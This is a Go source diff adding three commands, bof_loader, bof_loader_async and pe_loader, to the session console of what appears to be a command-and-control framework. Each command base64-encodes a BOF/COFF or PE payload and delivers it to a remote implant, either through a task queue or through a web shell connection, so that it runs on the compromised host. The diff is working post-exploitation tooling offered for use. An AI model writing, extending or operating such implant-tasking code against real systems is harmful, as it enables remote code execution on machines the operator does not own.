@@ -407,4 +407,147 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 		},
 	}
 	sessionApp.AddCommand(sessionPidInject)
+
+
+	sessionBOFLoader := &grumble.Command{
+		Name:     "bof_loader",
+		Help:     "delivers a BOF/COFF payload to be executed by the implant",
+		LongHelp: "delivers a BOF/COFF payload to be executed by the implant (pass arguments with -a)",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the BOF/COFF payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the BOF/COFF payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			operator := "server"
+
+			core.LogData(operator + " executed: bof_loader -a " + arguments + " " + uploadFile)
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+				sessionVal, sessionExists := core.Sessions.Load(activeSession)
+				if !sessionExists {
+					return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
+				}
+				session := sessionVal.(core.Session)
+
+				if session.CommandQuery != "" {
+					cmdString := "bof_loader"
+					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, arguments, fileb64)
+					if err != nil {
+						return err
+					}
+				} else {
+					cmdString := "bof_loader " + arguments + " " + fileb64
+					core.QueueImplantCommand(activeSession, cmdString, "server")
+				}
+
+				core.SuccessColorBold.Println("BOF: " + fileName + " should now be loaded!")
+			}
+
+			return nil
+		},
+	}
+	sessionApp.AddCommand(sessionBOFLoader)
+
+	sessionBOFLoaderAsync := &grumble.Command{
+		Name:     "bof_loader_async",
+		Help:     "delivers a BOF/COFF payload to be executed asynchronously (non-blocking)",
+		LongHelp: "delivers a BOF/COFF payload to be executed in a background goroutine while the implant continues checking in (pass arguments with -a). Results are returned on the next check-in after completion.",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the BOF/COFF payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the BOF/COFF payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			operator := "server"
+
+			core.LogData(operator + " executed: bof_loader_async -a " + arguments + " " + uploadFile)
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+				sessionVal, sessionExists := core.Sessions.Load(activeSession)
+				if !sessionExists {
+					return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
+				}
+				session := sessionVal.(core.Session)
+
+				if session.CommandQuery != "" {
+					cmdString := "bof_loader_async"
+					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, arguments, fileb64)
+					if err != nil {
+						return err
+					}
+				} else {
+					cmdString := "bof_loader_async " + arguments + " " + fileb64
+					core.QueueImplantCommand(activeSession, cmdString, "server")
+				}
+
+				core.SuccessColorBold.Println("BOF (async): " + fileName + " should now be queued!")
+			}
+
+			return nil
+		},
+	}
+	sessionApp.AddCommand(sessionBOFLoaderAsync)
+
+
+	sessionPELoader := &grumble.Command{
+		Name:     "pe_loader",
+		Help:     "delivers a PE payload to be executed by the implant",
+		LongHelp: "delivers a PE payload to be executed by the implant (pass arguments with -a)",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the PE payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the PE payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			operator := "server"
+
+			core.LogData(operator + " executed: pe_loader -a " + arguments + " " + uploadFile)
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+				sessionVal, sessionExists := core.Sessions.Load(activeSession)
+				if !sessionExists {
+					return errors.New("Session " + strconv.Itoa(activeSession) + " does not exist")
+				}
+				session := sessionVal.(core.Session)
+
+				if session.CommandQuery != "" {
+					cmdString := "pe_loader"
+					_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, arguments, fileb64)
+					if err != nil {
+						return err
+					}
+				} else {
+					cmdString := "pe_loader " + arguments + " " + fileb64
+					core.QueueImplantCommand(activeSession, cmdString, "server")
+				}
+
+				core.SuccessColorBold.Println("PE: " + fileName + " should now be loaded!")
+			}
+
+			return nil
+		},
+	}
+	sessionApp.AddCommand(sessionPELoader)
 }
